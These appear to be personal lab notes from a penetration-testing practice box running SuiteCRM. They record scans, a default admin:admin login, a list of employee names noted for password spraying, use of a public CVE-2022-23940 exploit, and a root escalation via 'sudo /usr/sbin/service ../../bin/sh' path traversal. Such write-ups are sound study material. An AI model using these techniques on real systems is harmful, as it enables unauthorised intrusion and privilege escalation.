My IP: 192.168.45.244
Target IP: 192.168.102.146

nmap:
```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 37:80:01:4a:43:86:30:c9:79:e7:fb:7f:3b:a4:1e:dd (RSA)
|   256 b6:18:a1:e1:98:fb:6c:c6:87:55:45:10:c6:d4:45:b9 (ECDSA)
|_  256 ab:8f:2d:e8:a2:04:e7:b7:65:d3:fe:5e:93:1e:03:67 (ED25519)
80/tcp    open  http    Apache httpd 2.4.38 ((Debian))
| http-title: SuiteCRM
|_Requested resource was index.php?action=Login&module=Users
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.38 (Debian)
| http-robots.txt: 1 disallowed entry 
|_/
3306/tcp  open  mysql   MySQL (unauthorized)
33060/tcp open  mysqlx  MySQL X protocol listener
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```


Port 80: Do manual enumeration to see what we find. 
- Login Page - admin:admin works
	- Found a employees page - below are the users
		- Will Westin
		- Sarah Smith
		- Max Jensen
		- Jim Brennan
		- Chris Olliver
		- Sally Bronsen
			- This would be a good idea to create a word list of all the users and use it for password spraying but first let maximize our other options
	- Found a Version number: **Version 7.12.3** / Sugar Version 6.5.25 (Build 344)
		- Was able to find an exploit ([CVE-2022-23940](https://github.com/manuelz120/CVE-2022-23940))
		- The exploit works and I was able to get an initial shell as "www-data", thus allowing for me to get the first flag.
		- Running `sudo -l` we find that we can run `(ALL) NOPASSWD: /usr/sbin/service` as root. We find that the parameters that we can run with this file path are ; `Usage: service < option > | --status-all | [ service_name [ command | --full-restart ] ]`.  
		- I tried finding cron jobs that we can run but there are none. I will result to using linpeas to find the service that we are looking for, that we can edit, likley place a rev shell in to get in as root. Im pretty sure it has something to do with the mysql services that we found earlier with nmap.
		- **Dead end (mysql):** mysql is bound to `0.0.0.0` but only allows `root@localhost` → `ERROR 1130 Host '...' is not allowed to connect`. No editable service file for the rev-shell idea either. The `service` binary itself IS the exploit — no rev shell needed.
		- **The actual privesc — GTFOBins `service` (Sudo):** `service` is a plain shell script (`cat /usr/sbin/service` → `#!/bin/sh`). Inside it hardcodes `SERVICEDIR="/etc/init.d"`, then at the end runs `exec env -i ... "$SERVICEDIR/$SERVICE" ...` — it pastes the name I give it onto `/etc/init.d/` and executes it, with **no validation**. So I feed it a path-traversal name so it runs `/bin/sh` instead of a real service:
		```
		sudo /usr/sbin/service ../../bin/sh
		```
		- `/etc/init.d/` + `../../bin/sh` collapses to `/bin/sh` → the `[ -x /bin/sh ]` check passes → it `exec`s `/bin/sh` as root → **root shell**.
		- Gave no command after the name, so `ACTION` is empty → the systemd branch falls through to `run_via_sysvinit`, which runs the init script (now `/bin/sh`) directly.
		- `id` → `uid=0(root)`. Root flag at `/root/proof.txt`. GTFOBins → `service` → **Sudo** tab is the shortcut for next time (no need to read the source under exam pressure).
		
	- Under Edit Employees there is an option for us to add a PFP for employees. Although this doesn't mean anything, it makes me wonder if there are more directories that we should know about. I will run gobuster
## Gobuster
```
.hta                 (Status: 403) [Size: 280]
.hta.php             (Status: 403) [Size: 280]
.hta.txt             (Status: 403) [Size: 280]
.hta.bak             (Status: 403) [Size: 280]
.htaccess            (Status: 403) [Size: 280]
.htaccess.bak        (Status: 403) [Size: 280]
.htpasswd            (Status: 403) [Size: 280]
.htaccess.txt        (Status: 403) [Size: 280]
.htpasswd.txt        (Status: 403) [Size: 280]
.htaccess.php        (Status: 403) [Size: 280]
.htpasswd.bak        (Status: 403) [Size: 280]
.htpasswd.php        (Status: 403) [Size: 280]
cache                (Status: 301) [Size: 318] [--> http://192.168.102.146/cache/]
config.php           (Status: 200) [Size: 0]
cron.php             (Status: 500) [Size: 21]
crossdomain.xml      (Status: 200) [Size: 2290]
custom               (Status: 301) [Size: 319] [--> http://192.168.102.146/custom/]
data                 (Status: 301) [Size: 317] [--> http://192.168.102.146/data/]
dictionary.php       (Status: 200) [Size: 23]
download.php         (Status: 200) [Size: 23]
export.php           (Status: 200) [Size: 23]
include              (Status: 301) [Size: 320] [--> http://192.168.102.146/include/]
index.php            (Status: 301) [Size: 0] [--> index.php?action=Login&module=Users]
index.php            (Status: 301) [Size: 0] [--> index.php?action=Login&module=Users]
install              (Status: 301) [Size: 320] [--> http://192.168.102.146/install/]
install.php          (Status: 200) [Size: 2324]
lib                  (Status: 301) [Size: 316] [--> http://192.168.102.146/lib/]
LICENSE.txt          (Status: 200) [Size: 34539]
maintenance.php      (Status: 200) [Size: 47]
metadata             (Status: 301) [Size: 321] [--> http://192.168.102.146/metadata/]
modules              (Status: 301) [Size: 320] [--> http://192.168.102.146/modules/]
pdf.php              (Status: 200) [Size: 23]
robots.txt           (Status: 200) [Size: 73]
robots.txt           (Status: 200) [Size: 73]
server-status        (Status: 403) [Size: 280]
service              (Status: 301) [Size: 320] [--> http://192.168.102.146/service/]
soap                 (Status: 301) [Size: 317] [--> http://192.168.102.146/soap/]
soap.php             (Status: 200) [Size: 76576]
themes               (Status: 301) [Size: 319] [--> http://192.168.102.146/themes/]
upload               (Status: 301) [Size: 319] [--> http://192.168.102.146/upload/]
vendor               (Status: 301) [Size: 319] [--> http://192.168.102.146/vendor/]
Progress: 18452 / 18452 (100.00%)

```

- I went to all mostly irrelevant. 


Port 22:  If we find creds we can abuse this!
- 